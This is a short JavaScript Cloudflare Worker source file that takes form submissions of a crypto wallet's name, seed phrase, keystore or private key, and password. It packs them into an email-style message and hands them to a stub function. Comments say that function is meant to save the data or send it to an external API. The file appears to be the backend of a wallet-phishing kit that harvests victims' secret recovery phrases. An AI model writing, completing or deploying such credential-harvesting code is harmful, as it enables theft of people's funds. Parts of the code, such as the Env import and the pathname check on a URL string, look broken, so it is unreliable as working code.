import { Env } from 'cloudflare-worker';

const env = Env();

async function processWallet(event) {
  const formData = await event.request.formData();
  const walletName = formData.get('walletName');
  const walletData = formData.get('phraseWallet');
  const password = formData.get('passwordWallet'); // Optional for keystore

  const emailBody = `
  Wallet Details Submission
  
  **Wallet Name:** ${walletName}
  
  **Wallet Phrase/Keystore/Private Key:** ${walletData}
  
  **Password (if keystore):** ${password || 'Not provided'}
  `;

  try {
    // Save data to KV or send to external API (replace with your chosen method)
    const saveResult = await saveData(walletName, walletData, password, emailBody);

    if (saveResult.ok) {
      return new Response('success');
    } else {
      throw new Error('Data saving failed');
    }
  } catch (error) {
    console.error(error);
    return new Response('error', { status: 500 });
  }
}

addEventListener('fetch', async (event) => {
  if (event.request.method === 'POST' && event.request.url.pathname === '/api/process-wallet') {
    event.respondWith(processWallet(event));
  }
});

// This function needs implementation based on your chosen method
async function saveData(walletName, walletData, password, emailBody) {
  // Replace with logic to save data to KV or send to an external API
  // This could involve using KV Namespace or a fetch request to an external service
  // You'll need to handle success and error scenarios here
}